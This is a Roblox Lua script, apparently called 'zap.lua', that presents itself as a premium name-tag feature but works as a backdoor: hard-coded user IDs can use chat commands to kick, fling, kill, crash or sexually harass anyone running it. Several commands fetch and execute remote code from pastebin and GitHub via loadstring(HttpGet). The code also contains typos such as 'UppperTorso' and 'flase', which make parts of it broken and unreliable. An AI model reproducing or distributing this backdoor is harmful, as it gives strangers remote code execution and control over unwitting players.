local StarId = {
	[3128475189] = true,
	[2244576018] = true,
	[1683670578] = true,
 	[715976876] = true,
	[2604028397] = true,
	[943527190] = true,
	[244225295] = true,
	[3323076730] = true,
	[2908771029] = true,
	[401984657] = true,
	[2557134457] = true,
	[2579528939] = true,
	[3234569780] = true,
	[739797913] = true,
	[554069643] = true,
	[704864053] = true,
	[882873696] = true,		
	[2788229376] = true,
	[243011466] = true,
	[180050164] = true,
	[2530475931] = true,
	[2752617727] = true,
	[244802002] = true,
	[244136742] = true,
	[1518463663] = true,
	[2782328820] = true,
}

local StaffId = {
	[2452452863] = true,
	[3449237561] = true,
	[229198462] = true,
}

local AdminId = {
	[1090807044] = true,
	[1703714954] = true,
}

function premium()
	for _,v in pairs(game:GetService('Players'):GetChildren()) do
		if StaffId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟]'..v.DisplayName)
				end
			local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= v then
					wait(0) print("[zap.lua] Error: Nil body.")
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
								hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
								hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
					end
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$void .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah yeah!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
        if cht:match("$disable .") then
            if game.Players.LocalPlayer ~= v then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua"))()
            end
        end
    end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$emoji 🔥") then
				if game.Players.LocalPlayer ~= v then
								while true do
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🔥]'..v.DisplayName)
									wait(1)
									end
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$animate") then
				if game.Players.LocalPlayer ~= v then
								while true do
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] z4')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za7')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.1')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.l')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lv')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu4')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lua')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] $$$$$$$')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.l')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] z')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] ')
								wait(1)
					end
				end
			end
		end)
end
		elseif StarId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
				end
local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= v then
					wait(0) print("[zap.lua] Error: Nil body.")
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
								hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
								hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
					end
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$void .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah yeah!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)
end
		elseif AdminId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
				end
local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= v then
					wait(0) print("[zap.lua] Error: Nil body.")
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
								hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
								hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
					end
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$void .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah yeah!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$animate") then
				if game.Players.LocalPlayer ~= v then
								while true do
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z4')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za7')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.1')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lv')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu4')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lua')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] $$$$$$$')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z')
									wait(1)
									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]')
									wait(1)
					end
				end
			end
		end)
		v.Chatted:connect(function(cht)
        if cht:match("$disable .") then
            if game.Players.LocalPlayer ~= v then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua"))()
            end
        end
    end)
	v.Chatted:connect(function(cht)
		if cht:match("$emoji 🔥") then
			if game.Players.LocalPlayer ~= v then
							while true do
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🔥]'..v.DisplayName)
								wait(1)
								end
			end
		end
	end)
------UNEXPECTED NVM LOL--------
		end
		end
	end
end
local success,err = pcall(premium)
